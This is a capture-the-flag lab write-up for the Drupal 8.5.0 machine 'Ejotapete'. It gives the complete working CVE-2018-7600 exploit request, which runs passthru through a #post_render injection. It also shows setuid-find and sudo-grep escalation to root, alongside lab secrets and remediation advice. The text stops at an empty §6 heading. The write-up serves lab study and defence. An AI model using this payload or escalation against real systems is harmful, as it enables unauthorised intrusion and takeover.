# 82 Ejotapete — writeup

**Lab:** 82 · *Ejotapete* · **Fácil**
**Description (full, from the platform catalog, `dockerlabs/catalog.txt:44`):** *"Máquina para
explotar una vulnerabilidad en un CMS drupal que no corre en la raíz del puerto 80, así como una
escalada de privilegios con dos vías distintas."*
**Target:** `172.17.0.7` — single container `ejotapete_container`, image `ejotapete:latest`.
**Stack (from the artefact, not from memory):** Debian GNU/Linux **9 (stretch)**, Apache **2.4.25**,
PHP **7.2.3** as `mod_php` (`php7_module (shared)`), **Drupal 8.5.0** as shipped *and* as running
(§9), SQLite as the datastore. One listening socket: `0.0.0.0:80`.
**Result:** unauthenticated → **`uid=33(www-data)`** → **`euid=0(root)`** (real uid stays 33).
**Reward:** `/root/secretitomaximo.txt` = `nobodycanfindthispasswordrootrocks`. No `FLAG{}` anywhere
(§8).

**Topology.** `auto_deploy.sh` was read, never run. It creates **no network at all** — a bare
`docker run -d --name $CONTAINER_NAME $IMAGE_NAME` on the default bridge, one container, no macvlan,
no `--internal`, no second host, no pivot. The engagement stayed single-host. The image's own
`Cmd` is `["apache2-foreground"]` with `ENTRYPOINT ["docker-php-entrypoint"]` and
`ExposedPorts {"80/tcp":{}}`, so the topology was readable from `docker inspect` before a single
packet was sent.

---

## 0. Platform fingerprint: the label is right, and the version is the whole answer

The queue says Drupal. **The label is correct** — this is the first platform in the corpus where the
catalogue's product name survives the check, and it is worth saying so explicitly, because the
corpus has four mislabelled labs (32, 220, 12, 26) and the reflex is to assume a fifth.

It is correct, but it is only *half* a fingerprint, and the half the catalogue gives you is the half
that does not matter. Read from a version-bearing file in the artefact, with the container entrypoint
overridden so nothing starts and no request is ever made:

```
$ docker run --rm --entrypoint sh ejotapete:latest \
    -c 'grep -n "const VERSION" /var/www/html/drupal/core/lib/Drupal.php'
85:  const VERSION = '8.5.0';
```

Corroborated three more ways, all read rather than recalled:

- the image's own build arguments, `docker inspect -f '{{json .Config.Env}}'`:
  `["DRUPAL_VERSION=8.5.0","DRUPAL_MD5=5679d3fa188fb80368ee46ab40acdb6b", …,"PHP_VERSION=7.2.3", …]`
- the profile's stamped header, `core/profiles/standard/standard.info.yml:47-50`:
  `version: '8.5.0'` / `core: '8.x'` / `datestamp: 1520457825`
- as served: `X-Generator: Drupal 8 (https://www.drupal.org)` — **which is why the response header is
  not a fingerprint either**: it says `8`, and the whole engagement turns on `8.5.0` vs `8.5.1`.

> **The version, not the product name, is what decides the attack surface — and this lab is a clean
> demonstration of it.** `8.5.0` and `8.5.1` are the same product, the same directory layout, the
> same `Generator` string, the same `standard` profile, and differ by **one file and one call**. That
> difference is the entire unauthenticated attack surface (§4). A tester who reads `Drupal 8` and
> looks for a `jsonapi` or a `rest` route finds nothing — and finds *nothing for the right reason*:
> JSON:API first shipped in 8.7, `rest` is not in `core.extension`, so `GET /drupal/jsonapi` → 404
> is a **version fact**, not a hardening fact. Nothing in this deployment was configured to remove
> those routes; they had not been written yet.

**Zero third-party code, measured three ways** — and this is what makes the lab a *core* lab:

| Measurement | Count |
|---|---|
| `ls /var/www/html/drupal/modules/` | **1** entry — `README.txt` |
| `ls /var/www/html/drupal/themes/` | **1** entry — `README.txt` |
| `core/modules` directories on disk | 75 |
| `core/themes` directories on disk | 6 |
| entries in `core.extension` | 42 (3 with weight > 0, 39 with weight 0) |
| `core.extension` names with **no** directory on disk | **1**, and it is `standard` — the *profile*, weight 1000 |
| `services.yml` files anywhere on the filesystem | **0** |
| `find -name RequestSanitizer.php` | **0** |

So there is no plugin, no contrib module, no contrib theme, no composer dependency to blame. The
sink is Drupal core, and the only question worth asking is which core version.

---

## 1. Surface

```
$ nmap -sV -Pn -p- 172.17.0.7
Nmap scan report for 172.17.0.7
Host is up (0.000045s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25
```

**What TCP cannot see — measured, not assumed:**

```
$ docker exec ejotapete_container cat /proc/net/udp
  sl  local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt  uid  timeout inode ref pointer drops
                                                <- header only: 0 rows, 0 bytes of data
$ docker exec ejotapete_container awk 'NR>1{print $2,$4}' /proc/net/tcp
  00000000:0050 0A      <- 0.0.0.0:80 and nothing else
```

`ps` confirms the process set and, as importantly, what is **absent**:

```
USER         PID COMMAND
root           1 apache2 -DFOREGROUND
www-data      17-21 apache2 -DFOREGROUND
```

**No `sshd`, no database daemon, no `cron`, no MTA, no Docker socket, no volumes** — the mount table
holds **3** entries and all three are Docker's own bind-ins (`/etc/resolv.conf`, `/etc/hostname`,
`/etc/hosts`). Compare lab 32, which shipped `sshd` and `mysqld` in the image `Cmd`; this lab ships
one process. **The whole engagement is one HTTP service, and both escalation rungs are inside that
one container.**

### 1.1 Paths — the catalogue's "not on the root of port 80" is a topology fact, and it costs you

`DocumentRoot` is `/var/www/html` and Drupal lives one level down at `/var/www/html/drupal`. That is
the entire content of the catalogue's first clause, and it is worth separating from the product
question: a directory name is a topology fact, a `const VERSION` is a fingerprint.

| Path | Result | Note |
|---|---|---|
| `/` | **403**, 285 B | `autoindex:error … No matching DirectoryIndex (index.php,index.html) found` — **not** a vhost and **not** a 404 |
| `/drupal/` | **200**, 8 892 B | the site; `X-Generator: Drupal 8`, `X-Powered-By: PHP/7.2.3` |
| `/drupal/user/login` | 200, 11 126 B | the only form that mattered (§4) |
| `/drupal/user/register` | 200, 38 077 B | the "Create new account" form — **and a false lead, see §5 N2** |
| `/drupal/admin` | **403**, 8 087 B | `access denied`, not a 404: the route exists |
| `/drupal/editor/dialog/image/basic_html` | **403** | `editor.use` delegates to the *text format* (§5 N3) |
| `/drupal/sites/default/files/.ht.sqlite` | **403** | `<FilesMatch "^\.ht">`, `apache2.conf:195-197` |
| `/drupal/sites/default/settings.php` | **403** | Drupal's own `<FilesMatch>`, `drupal/.htaccess:6-8` (§6, C9) |
| `/drupal/composer.lock` | **403** | **Drupal's own control**, `drupal/.htaccess:6` — see §6, C10 |
| `/drupal/jsonapi`, `/drupal/jsonapi/node` | **404** | a **version** fact: JSON:API is 8.7+ |
| `/drupal/update.php` | **403** | `settings.php:323` `$settings['update_free_access'] = FALSE;` |

**Three different 403s from three different directives**, which is exactly why a status code cannot
attribute a block. Each one is attributed in §6 with its own positive control.

---

## 2. The class

**Entry criterion (the boring one, unchanged since 61/108/32):** *does the platform expose a
write primitive or a code-execution primitive to an unauthenticated caller, and — before budgeting
for it — where does the write land?*

**Sources that settled it, in this order:**

1. `find -name RequestSanitizer.php` → **0 files**, and `grep -rl RequestSanitizer` over the entire
   docroot → **0 files**. A class in the *methodology* (`security`) is entirely absent. That is a
   fact worth ten minutes of recon by itself, and it is what pointed at the CVE.
2. `core/lib/Drupal/Core/DrupalKernel.php:544-546` — `preHandle()` goes **straight** to
   `loadLegacyIncludes()`. No sanitisation step in front of it.
3. `core/modules/file/src/Element/ManagedFile.php:175-179` — the sink, read in the artefact (§4).

---

## 3. Drupal's model: what the **unit of trust** is, and where the boundary is drawn

The brief asked for the Drupal-shaped answer to lab 61's "a plugin is *activated code*". Here it is,
stated generally.

### 3.1 WordPress's unit of trust, for contrast

In WordPress the unit is **a file that activation lists**. `wp_options.active_plugins` is a list of
paths that core `include`s. Activation answers exactly one question — *does this code run* — never
*is this code allowed to*. There is no manifest, no permission set, no sandbox, and the boundary is
not drawn anywhere in the application tree. Hence lab 61's rule: any write primitive anywhere in
WordPress is code execution, with no further step.

### 3.2 Drupal's unit of trust is **not** a list — it is a **compiled class graph, cached in the database**

Measured on this instance:

```
$ php -r '… SELECT COUNT(*), SUM(LENGTH(data)) FROM cache_container'
cache_container rows=2 bytes=643537
$ php -r '… SELECT data FROM config WHERE name="core.extension"'
42 entries; 3 with weight > 0 (menu_link_content=1, views=10, standard=1000)
settings.php:692:  $settings['container_yamls'][] = $app_root . '/' . $site_path . '/services.yml';
settings.php:795:  $config_directories['sync'] = 'sites/default/files/config_Z7me6…/sync';
```

Three consequences, and they are the transferable part:

1. **There is no `active_plugins` analogue, and that is not a hardening — it is a different question
   entirely.** WordPress asks "is this extension enabled?"; Drupal asks "does this class exist, and
   has the container been rebuilt?". The state lives in a **database row** (`config.core.extension`),
   not in a file, so "present vs active" is measurable — and, as in lab 61, the two sets are not the
   same list. Here they are trivially consistent, because there is nothing third-party to be
   inconsistent about (§0).
2. **The Drupal-shaped write primitive is not a file, it is a `services.yml` or a config object.**
   `sites/default/services.yml` is loaded into the container by `settings.php:692`, and a service
   definition *is* a class instantiation — a write there is code execution, and it is invisible to
   every "which extension is enabled?" question. **Measured: the file does not exist, and the write
   primitive is closed by a filesystem mode, not by a policy** — `sites/default` is `555`
   `www-data:www-data`, and `touch …/services.yml.probe` as `www-data` returns
   `cannot touch …: Permission denied`. So Drupal's answer to "activation is not a boundary" is
   *there is no activation to abuse*; the guard is a directory mode, and it is a **second**, thinner
   guard than anything in WordPress, because a single `chmod` reopens it and nothing in the
   application would object.
3. **The genuinely unguarded Drupal primitive is the config store, and I did not test it.** 174
   config objects in the `config` table, and `config_directories['sync']` at `settings.php:795`
   points at a directory of **mode 775** that `www-data` **can** write. Config import is how Drupal
   turns *data* into *behaviour* — a text format whose values are not code, whose effect is. This is
   Drupal's closest analogue of "a write primitive becomes code execution", and it is **listed under
   NOT tested** (§5) with the reason, not filed as a finding.

**The unit of trust, in one sentence: in Drupal the trusted unit is the compiled service container,
and it is neither listed in a file nor permissioned per item — so the boundary is not drawn in the
application at all. It is drawn in the webserver, and the webserver's half of it is one rewrite rule
whose force depends on a single word in a file the operator has never read (§4.3, F3).**

### 3.3 Where the boundary *is* drawn, and that it holds

Drupal ships **two** guards, and only one of them is load-bearing:

- `sites/default/files/.htaccess` — the stock 685-byte guard, `SetHandler
  Drupal_Security_Do_Not_Remove_See_SA_2013_003` plus `<IfModule mod_php5.c> php_flag engine off`.
- `drupal/.htaccess:6-8` — `<FilesMatch "…|composer\.(json|lock))$|…">` + `Require all denied`.
- `drupal/.htaccess:155` — `RewriteRule "^(.+/.*|autoload)\.php($|/)" - [F]`.

The differential in §4.3 proves the first is redundant and the third is the boundary. The
`<IfModule mod_php5.c>` half of the stock guard is **dead on this image** — the loaded module is
`php7_module`, not `mod_php5` (`apache2ctl -M`) — and `/tmp/.htaccess` is a byte-identical
**copy** of that same 685-byte guard sitting in a directory outside `DocumentRoot /var/www/html`, so
it can never apply to anything. It is a decoy the author left behind, and a tester who greps for
`.htaccess` finds two files and concludes "the guard is doubled". It is not.

---

## 4. The vulnerability: CVE-2018-7600 / SA-CORE-2018-002, property injection in the Forms API

### 4.1 The advisory, from the Drupal project's own git history — not from memory

The fix is the **only** commit between the `8.5.0` and `8.5.1` tags that touches anything but the
version string:

```
$ curl -s https://api.github.com/repos/drupal/drupal/compare/8.5.0...8.5.1 | jq …
commits: 2
  5ac8738fa6  SA-CORE-2018-002 by Jasu_M, samuel.mortenson, David_Rothstein, xjm, mlhess,
              larowlan, pwolanin, alex
  9798f28fe9  Drupal 8.5.1
files:
  modified  core/lib/Drupal.php
  modified  core/lib/Drupal/Core/DrupalKernel.php
  added     core/lib/Drupal/Core/Security/RequestSanitizer.php      <- the whole fix
```

The added class, quoted from that diff:

```php
public static function sanitize(Request $request, $whitelist, $log_sanitized_keys = FALSE) {
  if (!$request->attributes->get(self::SANITIZED, FALSE)) {
    // Process query string parameters.
    $get_sanitized_keys = [];
    $request->query->replace(static::stripDangerousValues($request->query->all(), $whitelist, $get_sanitized_keys));
    …
    // Request body parameters.
    $post_sanitized_keys = [];
    $request->request->replace(static::stripDangerousValues($request->request->all(), $whitelist, $post_sanitized_keys));
    …
    // Cookie parameters.
    …
  }
  return $request;
}

protected static function stripDangerousValues($input, array $whitelist, array &$sanitized_keys) {
  if (is_array($input)) {
    foreach ($input as $key => $value) {
      if ($key !== '' && $key[0] === '#' && !in_array($key, $whitelist, TRUE)) {
        unset($input[$key]);
        $sanitized_keys[] = $key;
      }
      else {
        $input[$key] = static::stripDangerousValues($input[$key], $whitelist, $sanitized_keys);
      }
    }
  }
  return $input;
}
```

and the call site inserted into `DrupalKernel::preHandle()`:

```php
 public function preHandle(Request $request) {
+    // Sanitize the request.
+    $request = RequestSanitizer::sanitize(
+      $request,
+      (array) Settings::get(RequestSanitizer::SANITIZE_WHITELIST, []),
+      (bool) Settings::get(RequestSanitizer::SANITIZE_LOG, FALSE)
+    );
 
     $this->loadLegacyIncludes();
```

**The fix is one sentence: strip every key beginning with `#` from GET, POST and COOKIE before the
application sees them.** The advisory is `SA-CORE-2018-002`, released 28 Mar 2018, CVE-2018-7600, and
the affected 8.x ranges are `< 8.3.9`, `< 8.4.6`, **`< 8.5.1`** — so **8.5.0 is the last vulnerable
release of the 8.5 branch**, which is plainly why the lab ships it.

> **A correction to the shape of the belief, and it is the reason this section exists.** The obvious
> place to look is the Form API's own `FormBuilder.php`, because that is where the form cache and the
> `#`-prefixed properties live. I downloaded the 8.5.1 copy and diffed it against the shipped one:
>
> ```
> $ diff -u lab82_FormBuilder_8.5.0.php d8.5.1_fb.php
> (no output)
> ```
>
> **Byte-identical.** The Forms API is not what changed. A tester who diffs the file that "must" be
> vulnerable — as this writeup did, for twenty minutes — concludes the site is patched. The fix is in
> `DrupalKernel`, one layer *above* every form, because the fix is about the **request**, not about
> forms. `FormBuilder.php` is a red herring, and it is a red herring by construction: the file is
> 50 KB of form plumbing and the patch is 99 lines in a namespace (`Drupal\Core\Security`) that did
> not exist before.

### 4.2 The sink, read in the artefact

`core/modules/file/src/Element/ManagedFile.php:175-193`:

```php
  public static function uploadAjaxCallback(&$form, FormStateInterface &$form_state, Request $request) {
    $renderer = \Drupal::service('renderer');

    $form_parents = explode('/', $request->query->get('element_parents'));

    // Retrieve the element to be rendered.
    $form = NestedArray::getValue($form, $form_parents);
    …
    $output = $renderer->renderRoot($form);
```

Two attacker-controlled pieces meet here:

- `element_parents` is a **query-string parameter read with no validation at all** (`:176`), and it
  selects a sub-array of the form to hand to the renderer (`:179`, `:193`);
- the **POST body** supplies the contents of that sub-array, and `#`-prefixed keys in a POST body are
  render-array properties in Drupal 8 (`#post_render`, `#pre_render`, `#access_callback`,
  `#lazy_builder`, `#type`, `#markup`).

So the request chooses *which part of the form to render* and *what it contains*. `Renderer::doRender()`
then calls the attacker-named callable. In 8.5.1 neither half survives, because `preHandle()` has
already deleted every `#`-prefixed key from both bags.

**The request, unauthenticated, one round trip:**

```
POST /drupal/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1
&mail[a][#post_render][]=passthru
&mail[a][#type]=markup
&mail[a][#markup]=id
```

`ajax_form` is `FormBuilderInterface::AJAX_FORM_REQUEST` (`FormBuilderInterface.php:23`); `_drupal_ajax=1`
makes the form cache itself and return a build id; `form_id=user_register_form` is the anonymous
`/drupal/user/register` form; `account/mail/%23value` walks the form tree to the `mail` element's
`#value`, which is exactly where the POST body landed. `passthru` is the callable; its return value
replaces the element, so **the command's stdout comes back in the response body** — an in-band
oracle, not a blind one.

### 4.3 The chain, with the identity proof at every hop

| # | → | Mechanism | Identity proof (uid/euid as a pair) |
|---|---|---|---|
| 1 | **`uid=33(www-data)`** | CVE-2018-7600 property injection: `ManagedFile::uploadAjaxCallback` renders an attacker-shaped sub-array; `Renderer::doRender()` calls `passthru` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)`; `Uid: 33 33 33 33` / `Gid: 33 33 33 33`; `pwd` = `/var/www/html/drupal` |
| 2 | **`euid=0(root)`** | `/usr/bin/find` is mode **4755** and baked into the image; `find … -exec sh -c '…'` runs the child with euid 0 | `uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)`; **`Uid: 33 0 0 0`** (real 33, effective 0, saved-set 0, fs 0); `Gid: 33 33 33 33` |
| 3 | **reward** | the same `find -exec cat` reads a `drwx------ root` file | `/root/secretitomaximo.txt` = `nobodycanfindthispasswordrootrocks` (35 B) |

Hop 2 is a **setuid transition with an asymmetric pair**, and the pair is the finding: the process
is still `www-data` in every real sense, and only its *effective* uid is 0. `id` alone
(`uid=33(www-data) … euid=0(root)`) already shows it, and `/proc/self/status` line 4 of the output
(`Uid: 33 0 0 0`) is the part that cannot be misread.

**The manufactured oracle (RUNBOOK: "when the vector has no oracle, build the oracle before you
exploit"), written and then read back through the same vector:**

```
== MANUFACTURED ORACLE ==
-rw-r--r-- 1 root www-data 98 /root/LAB82-1790794856-root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
Uid:	33	0	0	0
Gid:	33	33	33	33
== CONTROL: identical write as www-data, no setuid find ==
sh: 6: cannot create /root/LAB82-1790794856-wwwdata: Permission denied
```

A uniquely-marked file, in a directory `www-data` provably cannot write, created by the payload and
re-read by the payload. The control is the *same* command one line apart in the same request.

**The full chain in one request, with the negative control inside it:**

```
== HOP1: the execution identity of the CVE payload ==
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Uid:	33	33	33	33
Gid:	33	33	33	33
Groups:	33
/var/www/html/drupal
== HOP2: setuid /usr/bin/find, uid/euid pair ==
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
Uid:	33	0	0	0
Gid:	33	33	33	33
Groups:	33
== HOP3: read the reward the same way ==
nobodycanfindthispasswordrootrocks
== CONTROL: the identical command WITHOUT the setuid find, as www-data ==
cat: /root/secretitomaximo.txt: Permission denied
ls: cannot open directory '/root/': Permission denied
```

**This exact transcript replays byte-for-byte (1 204 bytes) on a container recreated from the image
after the engagement** (§9) — so it is a property of the target, not of a moment in it.

### 4.4 Why `/usr/bin/find` is planted and not stock

Fourteen setuid/setgid binaries exist. Thirteen are stock Debian. The fourteenth is `find`, and four
independent measurements separate it from its own package:

```
$ ls -la /usr/bin/find /usr/bin/xargs          # same package, same mtime
-rwsr-xr-x 1 root root 221768 Feb 18  2017 /usr/bin/find      <- 4755
-rwxr-xr-x 1 root root  67800 Feb 18  2017 /usr/bin/xargs    <-  755

$ grep -n 'bin/find' /var/lib/dpkg/info/findutils.md5sums
1:b55e8d547380b3f0b80519049d461fbe  usr/bin/find
$ md5sum /usr/bin/find
b55e8d547380b3f0b80519049d461fbe                       <- byte-identical to the package

$ dpkg -V findutils | grep -c 'usr/bin/find'
0                                                      <- dpkg says the tree is unmodified
```

Same `dpkg` owner, same `mtime` to the second as its sibling from the same package, byte-identical to
the packaged checksum — **and mode 4755 where its sibling is 755.** `chmod` does not touch `mtime`, so
the setuid bit was applied after install. And note the last line: **`dpkg -V` does not verify modes**,
so the distro's own integrity tool reports this file as pristine. An absence from a verifier is not
an absence of the property (§11.6 of the self-corrections, wearing a new costume).

### 4.5 The second escalation path, and why "two paths" is precisely true

`/etc/sudoers:6`, the last line, is the only non-stock line in the file:

```
ballenita ALL=(root) NOPASSWD: /bin/ls, /bin/grep
```

```
== id as entered ==
uid=1000(ballenita) gid=1000(ballenita) groups=1000(ballenita)

User ballenita may run the following commands on ad55c1d4d37e:
    (root) NOPASSWD: /bin/ls, /bin/grep

--- PATH A: /bin/ls as root ---
total 32
drwx------ 1 root root     4096 Sep 30 19:03 .
-rw-r--r-- 1 root www-data   98 Sep 30 19:03 LAB82-1790794856-root
-rw-r--r-- 1 root root      35 Oct 16  2024 secretitomaximo.txt
--- PATH B: /bin/grep as root ---
nobodycanfindthispasswordrootrocks
--- CONTROL 1: a program NOT on the grant ---
sudo: a password is required
--- CONTROL 2: /bin/ls cannot read file contents ---
/root/secretitomaximo.txt
```

**This is the catalogue's "escalada de privilegios con dos vías distintas", and the useful reading is
not "two ways in" — it is that the two lines do different jobs and only one of them is the reward.**
`ls` reveals *names*; `grep` reveals *contents*. Path A alone does **not** read the file — control 2
prints the path and stops. **An operator who removes `/bin/ls` from the grant has closed nothing.**

> **Honesty note on how `ballenita` was entered, because this is the weakest link in the writeup and
> §25 applies.** The grant was exercised **on the target container** — same image, same filesystem,
> same `/etc/sudoers` — but the `ballenita` identity was entered by the operator
> (`docker exec --user ballenita`), not reached by the chain. That is stated, not buried, and the
> reason is measured rather than asserted:
>
> - From **unauthenticated**: nothing. `user.settings` `register=visitors_admin_approval`,
>   `verify_mail=1`; §5 N2.
> - From **`uid=33(www-data)`**: no route to uid 1000 in the image. No setuid helper drops
>   privileges, and two of them *actively refuse* the euid-0-with-ruid-33 position the chain reaches:
>   `su -s /bin/sh ballenita` → `su: must be run from a terminal` (Debian's
>   `pam_securetty` in `/etc/pam.d/su` keys on the **real** uid), and `sudo -n -u ballenita` →
>   `sudo: a password is required` (sudo authenticates on the **real** uid, which is still 33).
> - From **`euid=0`**: a route exists, and it is trivial — `/etc/shadow` is `-rw-r----- root:shadow`
>   and `ballenita` is `$6$…` SHA-512. I did not crack it, and I therefore make **no claim** that
>   uid 1000 is unreachable. The accurate statement is narrower and the one that matters for
>   severity: **the sudoers ladder and the setuid ladder are disjoint, and an attacker who takes the
>   setuid ladder has no reason to take the sudoers one.**

---

## 5. Findings

### F1 — Drupal 8.5.0: unauthenticated remote code execution, CVE-2018-7600 / SA-CORE-2018-002

**CWE-502 (deserialization of untrusted data — render-array property injection) / CWE-20 · Critical**

```
POST /drupal/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
form_id=user_register_form&_drupal_ajax=1
&mail[a][#post_render][]=passthru&mail[a][#type]=markup&mail[a][#markup]=id
->
HTTP/1.1 200 OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[{"command":"insert","method":"replaceWith","selector":null,"data":"<span class=\"ajax-new-content\"></span>","settings":null}]
```

No authentication, no session, no user, no second request, and the output arrives **in band**.
Root cause, in the artefact: `ManagedFile.php:176` reads `element_parents` from the query string and
hands the addressed sub-array to `renderRoot()` at `:193`, with no validation of either the path or
the `#`-prefixed properties inside it; the compensating control (`DrupalKernel::preHandle()` →
`RequestSanitizer::sanitize()`) **does not exist in this file** — `find -name RequestSanitizer.php`
→ 0, `DrupalKernel.php:544-546` has no sanitisation call.

**Impact.** Unauthenticated code execution as the web-server user, with the database credential
reachable in memory. Combined with F2 it is unauthenticated-to-root.

**Remediation.** Upgrade to 8.5.8 or later (8.5.x is EOL; 8.5.1 fixes *this* advisory, 8.5.8 fixes
the ones after it). The fix is 99 lines and one call site — there is no configuration that
substitutes for it. As defence in depth, `Settings::get('sanitize_input_logging', TRUE)` on a patched
branch makes the stripping visible instead of silent.

### F2 — `/usr/bin/find` is setuid root in the shipped image, and `-exec` runs as euid 0

**CWE-269 (improper privilege management) / CWE-732 · Critical**

`uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)`, `Uid: 33 0 0 0`, and the
manufactured oracle in `/root` written and read back (§4.3). Proof that the bit is not from the
package: byte-identical md5 against `findutils.md5sums`, same `mtime` as `/usr/bin/xargs` from the
same package, mode 4755 against the sibling's 755, and `dpkg -V` reporting nothing (§4.4).

**Impact.** Any process that can execute `find` — which on this host is `www-data`, i.e. every
request — becomes euid 0. This is the whole second half of the lab.

**Remediation.** `chmod 0755 /usr/bin/find`. `find` has no reason to be setuid; the setuid bit is
almost certainly an accident of image construction, and if it is deliberate it needs a comment saying
what it is for. Add a build assertion — `find / -perm -4000` diffed against the expected set — to
the image build, the way §3 of the RUNBOOK reads `entrypoint.sh` for exactly this reason.

### F3 — the entire PHP-in-subdirectory boundary rests on one word in a file the operator has never read

**CWE-16 (configuration) / CWE-693 (protection mechanism failure) · High — and the negative result is the point**

Drupal's boundary is one rewrite rule:

```
/var/www/html/drupal/.htaccess:155
  RewriteRule "^(.+/.*|autoload)\.php($|/)" - [F]
```

and `.htaccess` files are only read at all if the server permits them. Two files disagree:

```
/etc/apache2/apache2.conf:170-174          <Directory /var/www/>   Options Indexes FollowSymLinks
                                                              AllowOverride None
/etc/apache2/conf-enabled/docker-php.conf:8-11
                        <Directory /var/www/>   Options -Indexes
                                                 AllowOverride All
```

`conf-enabled/*.conf` is included at `apache2.conf:222`, **after** the `<Directory>` block at `:170`,
so `AllowOverride All` wins. Both are shipped by the same official `php:7.2.3-apache` image.

**The differential, which is the only reason I know which directive is live:**

| State | `sites/default/files/lab82_sub.php` |
|---|---|
| a) as deployed | **403** |
| b) `files/.htaccess` replaced with only the `SetHandler` catch-all | 403 |
| c) `files/.htaccess` replaced with only the `<IfModule mod_php5.c>` guard | 403 |
| d) **`files/.htaccess` deleted entirely** | **403** |
| e) both probes created, `files/.htaccess` still deleted | 403 — but the same file at the **Drupal root** → **200, `LAB82-PHP-EXEC uid=33`** |
| f) `drupal/.htaccess:155` `[F]` → `[L]` | **200, `LAB82-PHP-EXEC uid=33`** |
| g) line 155 restored, `AllowOverride All` → `None` in `docker-php.conf:10` | **200, `LAB82-PHP-EXEC uid=33`** |

**Reading of the table.** Deleting Drupal's own `files/.htaccess` — the file whose name, comment
(`Do not remove`) and placement all say it is the security boundary — changes **nothing** (d). The
load-bearing control is line 155 of the *root* file (f). And the whole of that is contingent on
`AllowOverride` (g): with the standard Apache value, Drupal's rewrite rule stops being read and the
entire `core/`, `sites/`, `vendor/` and `modules/` trees become writable-then-executable surfaces —
while the site keeps serving 200 on every page and logs **no error at all**.

**Remediation.** Move the boundary out of `.htaccess` and into the vhost, where it cannot be voided
by an `AllowOverride` in a file from another project:

```apache
<Directory /var/www/html/drupal>
    <FilesMatch "\.php$">
        Require all granted
    </FilesMatch>
    # everything else, anywhere in the tree
</Directory>
```

or, more simply, `php_admin_value open_basedir` / `disable_functions` scoped to the pool, or move
the document root down to `drupal/` so there is no subdirectory tree to protect at all (which is also
what the catalogue's "not on the root of port 80" is complaining about, one level up from here).
Whichever you pick: **make it impossible for the guard to be present and inert**, which is the exact
failure mode here and the exact failure mode in lab 146.

### F4 — `sites/default/settings.php` is mode 444 and holds the `hash_salt`

**CWE-522 / CWE-276 · High (lateral — stated precisely, see below)**

```
$ stat -c '%n mode=%a size=%s owner=%U:%G' /var/www/html/drupal/sites/default/settings.php
/var/www/html/drupal/sites/default/settings.php mode=444 size=32133 owner=www-data:www-data

settings.php:300:  $settings['hash_salt'] = 'uBEGMYLcuSjIMRM1pENikjlmbYFEryEyQQ9RqyCpqk36iElxl8I0yZdzB5EmVpdIxsdW8s_7BA';
settings.php:788-793: $databases['default']['default'] = array ('database' => 'sites/default/files/.ht.sqlite', …);
```

Mode **444** means every local account on the host reads it — `ballenita` included, and every future
service account, and every process that lands a shell as any uid. `hash_salt` is the seed for
Drupal's session and CSRF-token derivation, so a local account can mint a valid session for
`uid=1 ballenita` without ever touching that account's password hash.

**This is a lateral finding and the writeup says so.** It is **not** remotely reachable: seven
variants probed, `settings.php` → 403 (Drupal's own `<FilesMatch>` at `drupal/.htaccess:6-8`),
`settings.phps`/`settings.php~`/`settings.php.bak`/`%2ephp` → 404/403, and a whole-tree search for
backup variants. The foothold is hop 1, and the two compose.

**Remediation.** `chmod 640`, owner `www-data`, group a dedicated `drupal` group. Keep the file out
of the document root entirely — the shipped default `default.settings.php` shows the intended
pattern, and this lab moved `settings.php` into the web root and then made it readable by all.

### F5 — the SQLite datastore is mode 644: the whole application state is world-readable on the host

**CWE-732 / CWE-922 · Medium (lateral)**

```
/var/www/html/drupal/sites/default/files/.ht.sqlite mode=644 size=11112448 owner=www-data:www-data
```

64 tables, 174 config objects, 1 real user, 0 nodes. Any local account reads every password hash, the
`user_pass_reset` tokens if any are live, and the full config — including `system.site`, the filter
formats and the `editor` entities. Not remotely reachable: `GET /drupal/sites/default/files/.ht.sqlite`
→ **403**, from `<FilesMatch "^\.ht">` (`apache2.conf:195-197`), with the control that a `.txt` in the
*same* directory returns **200**. That control is what makes the 403 a fact about the *name* rather
than about the directory.

**Remediation.** Move the SQLite file out of the document root, or `chmod 640`. A dotfile name is
not an access control; it is a filename pattern in one `<FilesMatch>`, and the moment somebody
switches to nginx — which reads no `.htaccess` and honours no `^\.ht` — the entire database is
public. **This is the same "the guard is a convention the next deployment will not keep" shape as
F3, and the two should be fixed in the same change.**

### F6 — unauthenticated self-registration writes a permanent, role-less, blocked account row

**CWE-20 / CWE-400 · Low — a real negative reported next to a real positive**

The register form is served to anonymous visitors and **accepts the submission**:

```
POST /drupal/user/register   form_id=user_register_form&form_build_id=form-…&name=lab82probe&mail=lab82probe@example.invalid
-> HTTP/1.1 303, Location: http://172.17.0.7/drupal/, one SESS… cookie set
```

and the account is really created:

```
uid=2 name=lab82probe mail=lab82probe@example.invalid status=0
user__roles: 1 row only — uid 1 → administrator
```

`status=0` (blocked/pending), **zero role rows for uid 2**, and three independent confirmations that
it is not a foothold: `/drupal/user` → **302 to `/drupal/user/login`**; `/drupal/user/1` → **403**;
and `user.settings` `register=visitors_admin_approval`, `verify_mail=1`.

So this is **not** an authentication bypass, and filing it as one would be inventing a finding. What
it *is*: an unauthenticated, unrate-limited, un-CAPTCHA'd insert into the account store, with no way
for the operator to notice. On a real site that is a mail-relay and storage-abuse primitive, and at
minimum a spam surface.

**Remediation.** Set `register` to `USER_REGISTER_ADMINISTRATORS` (or add a CAPTCHA + rate limit +
mail verification). Nothing in the Drupal default profile asks you to.

### F7 — the docroot is world-writable

**CWE-732 · Low (context, not a chain step)**

`/var/www/html mode=777 owner=www-data:www-data`, and `sites/default/files/php` and
`…/files/php/twig` are **777** as well — the compiled-Twig cache is writable by *every* uid on the
host, including `ballenita`. Not used in this chain (the RCE was already `www-data`), and the
`[F]` rewrite rule stops the consequence — but it is the reason F3 matters: a world-writable
directory one `AllowOverride` away from execution is a latent primitive, not a hardened one.

**Remediation.** `chmod 755` on the docroot, `750` on the Twig cache.

---

## 6. Controls that held

Every row has a positive control: a case where the same detector was shown firing, or an explicit
statement that the control's *success* path was demonstrated before the negative was believed.

